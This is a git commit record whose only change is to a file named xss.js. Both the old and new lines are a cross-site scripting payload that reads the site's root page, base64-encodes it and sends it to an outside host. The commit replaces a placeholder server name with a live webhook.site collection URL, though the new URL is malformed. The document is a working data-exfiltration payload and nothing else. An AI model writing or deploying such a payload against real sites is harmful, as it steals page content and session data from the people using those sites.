a6e4b127f6f9522534abf485494bb3c50ecf24e2
Zoulouh65 <bstrazzera@an21.fr>
2025-03-19 11:49:34 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-fetch('/').then(r => r.text()).then(d => fetch('http://TONSERVEUR/xss?data=' + btoa(d)))
+fetch('/').then(r => r.text()).then(d => fetch('http://https://webhook.site/ede3adf6-696e-4862-b954-010d8adf94a6/xss?data=' + btoa(d)))
